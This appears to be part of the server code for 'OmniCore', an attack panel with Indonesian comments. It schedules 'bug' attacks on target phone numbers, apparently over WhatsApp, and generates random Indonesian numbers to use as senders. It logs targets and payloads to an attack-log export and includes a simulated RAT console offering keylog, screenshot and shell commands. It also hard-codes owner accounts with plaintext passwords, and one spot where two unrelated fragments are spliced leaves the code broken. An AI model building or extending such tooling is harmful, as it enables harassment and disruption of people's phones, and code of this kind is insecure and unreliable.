// ===== DEFAULT OWNERS (PASSWORD TERBARU) =====
const defaultOwners = [
  { username: 'ARZ', password: 'CORE V1', role: 'owner' },
  { username: 'EPIN', password: 'CORE V2', role: 'owner' },
  { username: 'manzz', password: 'CORE V3', role: 'owner' }
];

// Saat inisialisasi database
db.serialize(() => {
  // ... tabel users sudah dibuat

  // Insert atau update default owners
  defaultOwners.forEach(owner => {
    db.get(`SELECT * FROM users WHERE username = ?`, [owner.username], (err, row) => {
      if (!row) {
        // Jika belum ada, insert baru
        db.run(`INSERT INTO users (username, password, role) VALUES (?, ?, ?)`,
          [owner.username, owner.password, owner.role]);
        console.log(`[DB] Owner ${owner.username} ditambahkan dengan password baru`);
      } else {
        // Jika sudah ada, update password (agar sesuai)
        db.run(`UPDATE users SET password = ? WHERE username = ?`,
          [owner.password, owner.username]);
        console.log(`[DB] Password Owner ${owner.username} diperbarui`);
      }
    });
  });
});) => {
    if (err) return res.status(500).json({ error: err.message });
    let csv = 'ID,Type,Target,Payload,Status,CreatedAt\n';
    rows.forEach(row => {
      csv += `${row.id},${row.type},${row.target},${row.payload},${row.status},${row.created_at}\n`;
    });
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename=attack_logs.csv');
    res.send(csv);
  });
});

// ============================================================
// ENDPOINT: SCAN (Generate random numbers)
// ============================================================
app.post('/api/scan', (req, res) => {
  const { count } = req.body;
  const numbers = [];
  for (let i = 0; i < (count || 20); i++) {
    const prefix = '628';
    const random = Math.floor(100000000 + Math.random() * 900000000);
    numbers.push(prefix + random);
  }
  res.json({ numbers });
});

app.post('/api/scan/add-all', (req, res) => {
  const { numbers } = req.body;
  if (!numbers || !numbers.length) return res.status(400).json({ error: 'Tidak ada nomor' });
  const stmt = db.prepare(`INSERT OR REPLACE INTO senders (number, label) VALUES (?, ?)`);
  numbers.forEach(n => stmt.run(n, n));
  stmt.finalize();
  res.json({ status: 'ok', added: numbers.length });
});

// ============================================================
// ENDPOINT: SCHEDULE
// ============================================================
app.post('/api/schedule/add', (req, res) => {
  const { target, bug_type, schedule_time } = req.body;
  if (!target || !bug_type || !schedule_time) return res.status(400).json({ error: 'Data tidak lengkap' });
  db.run(`INSERT INTO schedules (target, bug_type, schedule_time) VALUES (?, ?, ?)`,
    [target, bug_type, schedule_time], function(err) {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ status: 'ok', id: this.lastID });
    });
});

app.get('/api/schedule/list', (req, res) => {
  db.all(`SELECT * FROM schedules ORDER BY schedule_time ASC`, (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.delete('/api/schedule/delete/:id', (req, res) => {
  const id = req.params.id;
  db.run(`DELETE FROM schedules WHERE id = ?`, id, function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ status: 'ok', affected: this.changes });
  });
});

// ============================================================
// ENDPOINT: RAT (Simulasi)
// ============================================================
app.post('/api/rat/command', (req, res) => {
  const { command } = req.body;
  if (!command) return res.status(400).json({ error: 'Perintah kosong' });
  let response = `> Perintah "${command}" dikirim ke target.\n> Menunggu respon...\n> [OK] 192.168.1.100 menerima perintah.`;
  if (command === 'help') {
    response = `> Perintah tersedia: help, info, screenshot, keylog, lock, shutdown, reboot, install, uninstall, download, upload, shell, exit\n> Ketik salah satu perintah untuk menjalankan.`;
  } else if (command === 'info') {
    response = `> Sistem: Windows 10 Pro\n> Hostname: TARGET-PC\n> IP: 192.168.1.100\n> User: Administrator\n> RAM: 8GB (67% digunakan)`;
  } else if (command === 'screenshot') {
    response = `> Screenshot berhasil diambil!\n> File: /storage/screenshot_${Date.now()}.png`;
  }
  db.run(`INSERT INTO logs (type, target, payload, status) VALUES (?, ?, ?, ?)`,
    ['rat', '192.168.1.100', command, 'executed']);
  res.json({ status: 'ok', output: response });
});

// ============================================================
// ENDPOINT: USERS
// ============================================================
app.post('/api/users/add', (req, res) => {
  const { username, password, role } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'Username dan password wajib' });
  db.run(`INSERT INTO users (username, password, role) VALUES (?, ?, ?)`,
    [username, password, role || 'user'], function(err) {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ status: 'ok', id: this.lastID });
    });
});

app.get('/api/users/list', (req, res) => {
  db.all(`SELECT id, username, role, created_at FROM users ORDER BY created_at DESC`, (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.delete('/api/users/delete/:username', (req, res) => {
  const username = req.params.username;
  if (username === 'arzzero') return res.status(403).json({ error: 'Tidak bisa menghapus owner utama' });
  db.run(`DELETE FROM users WHERE username = ?`, username, function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ status: 'ok', affected: this.changes });
  });
});

// ============================================================
// ENDPOINT: SETTINGS
// ============================================================
app.get('/api/settings', (req, res) => {
  db.all(`SELECT * FROM settings`, (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    const settings = {};
    rows.forEach(row => settings[row.key] = row.value);
    res.json(settings);
  });
});

app.post('/api/settings', (req, res) => {
  const { key, value } = req.body;
  if (!key) return res.status(400).json({ error: 'Key wajib' });
  db.run(`INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)`, [key, value], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ status: 'ok' });
  });
});

// ============================================================
// ENDPOINT: TELEGRAM TEST
// ============================================================
app.post('/api/telegram/test', async (req, res) => {
  const { token, chatId } = req.body;
  if (!token || !chatId) return res.status(400).json({ error: 'Token dan Chat ID wajib' });
  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: '🔥 OMNICORE test notifikasi berhasil!' })
    });
    const data = await response.json();
    if (data.ok) {
      res.json({ status: 'ok', message: 'Notifikasi terkirim' });
    } else {
      res.status(400).json({ error: data.description });
    }
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, () => {
  console.log(`🔥 OmniCore Backend berjalan di port ${PORT}`);
  connectWA();
});
